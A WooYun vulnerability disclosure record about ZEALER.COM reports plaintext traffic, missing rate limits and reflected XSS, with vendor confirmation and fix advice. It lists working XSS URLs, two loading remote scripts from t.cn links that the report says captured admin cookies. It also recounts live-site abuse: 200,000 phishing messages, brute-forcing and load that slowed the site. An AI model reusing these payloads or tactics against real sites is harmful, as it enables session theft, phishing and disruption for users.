{"id": 31523, "wybug_id": "wooyun-2015-0113747", "wybug_title": "Zealer应用层若干漏洞打包(批量刷赞私信xss打后台改价格删订单)", "wybug_corp": "ZEALER.COM", "wybug_author": "kevinchowsec", "wybug_date": "2015-05-18 11:26", "wybug_open_date": "2015-07-06 15:10", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "安全报告"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向公众公开  简要描述： 我在2015-03-26对Zealer一次检测，发现Zealer的若干应用层漏洞，从业务逻辑到web安全漏洞打包，发送到wooyun，审核不通过，原因是“问题均相对鸡肋，可有更有效的危害？”，我便把报告发送到“hi@zealer.com”，若干天后回复我“我们的技术团队让我向你转达谢意，你的建议对我们非常重要，谢谢。”然而，5月10日我对zealer再一次访问，并对之前的漏洞进行验证，发现均无修复，感觉“duang”！我今天还是把漏洞列出来，并加上危害利用。2015-03-26报告如下：今天不谈王自如，主角是Zealer开发工程师，发现问题分点陈列如下： 详细说明：  1.1、业务逻辑漏洞①、明文传输敏感信息通过抓包工具，发现客户端与服务端交互数据包为明文传输，在网络传输中未采用可靠加密方式。②、对批量高并发数据无限制机制通过工具提交交互数据包，服务端没有对批量高并发提交的数据进行检测与限制。1.2、以上2个脆弱性组合成的详细的漏洞证明或威胁请参考1.5-------------------------------------------------------------1.3、Web安全漏洞①、XSS跨站脚本检测过程中发现主站(www.zealer.com)与子站(fix.zealer.com)存在多处跨站漏洞。②、flash跨域策略文件crossdomain.xml配置不正确检测过程中发现主站(www.zealer.com)与子站(fix、static、img)的crossdomain.xml未正确配置。1.4、详细的漏洞证明或威胁请参考1.7   漏洞证明：  1.5、业务逻辑漏洞证明①、猜解Zealer数据库中存在的用户名，遭社会工程学威胁\n\n②、猜解Zealer数据库中存在的邮箱，遭社会工程学威胁\n\n③、批量注册用户，遭资源耗费威胁\n\n④、暴力破解系统存在用户密码，遭信息泄露威胁\n\n⑤、批量指定发送找回密码邮件，遭骚扰用户威胁\n\n⑥、批量指定发送手机绑定验证码，遭骚扰用户威胁\n\n⑦、暴力破解手机绑定验证码，遭信息泄露威胁\n\n\n\n批量向用户发送钓鱼私信，20W条数据，100个并发↓\n\n\n\n\n\n批量点赞某条评论，2W条数据，50个并发↓\n\n\n\n由于对批量高并发数据无限制机制，导致官网极其容易被ddos，以上的12W条攻击，已经造成用户打开页面迟缓，丢包现象严重。下图为我在远程服务器访问www.zealer.com的截图（PS：网络管理员可以查查5.12的夜晚流量走势图）↓\n\n1.6、业务逻辑漏洞修复建议请参考1.9-------------------------------------------------------------1.7、Web安全漏洞证明①、XSS跨站脚本5个，详情如下：\nhttp://fix.zealer.com/login/OrdersCheck?callback=<script src=http://t.cn/RAFkqBv></script>\n\n\n\nhttp://fix.zealer.com/login/login?callback=<script>alert('xss test')</script>\n\n\n\nhttp://www.zealer.com/reg?from=%3E%22%27%3E%3Cscript%3Ealert%28%27xss test%27%29%3C%2Fscript%3E\n\n\n\nhttp://www.zealer.com/reg?from=Index&redirect=http://www.zealer.com/\"/><script src=http://t.cn/RAFkQQo></script>\n\n\n\nhttp://www.zealer.com/reg?from=Index\"/><script>alert('xss test')</script>&redirect=http://www.zealer.com/\n\n\n打到的后台地址和cookie：\n\nfix后台管理界面（打单、用户信息查询等）：\n\nrephone后台管理界面（价格修改，产品下架，优先码生成等）：\n\n②、flash跨域策略文件crossdomain.xml配置不正确\nhttp://www.zealer.com/crossdomain.xmlhttp://fix.zealer.com/crossdomain.xmlhttp://static.zealer.com/crossdomain.xmlhttp://img.zealer.com/crossdomain.xml\n\n\n1.8、Web安全漏洞修复建议请参考2.0   修复方案：  1.9、业务逻辑漏洞修复建议①、客户端与服务端数据传输使用可靠加密方式；②、对批量高并发数据进行检测发现与限制。2.0、Web安全漏洞修复建议①、修复XSS跨站漏洞，严格过滤危险关键字符；②、正确配置flash跨域策略文件crossdomain.xml。   版权声明：转载请注明来源 kevinchowsec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-22 15:08 厂商回复： 安全等级确实做得不足，业务快速快展的阶段没有做好安全这一块，感谢给我们提前做了一次预警，接下来我们会尽快花时间修改相关的漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-13 20:44 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  好网站呀    \n     2015-05-14 09:10 |    \t\tkevinchowsec \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:5        | 周凯文，信息安全爱好者。)\t\t \n  @zeracker 没啥，简单的东西！只不过他们不重视！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}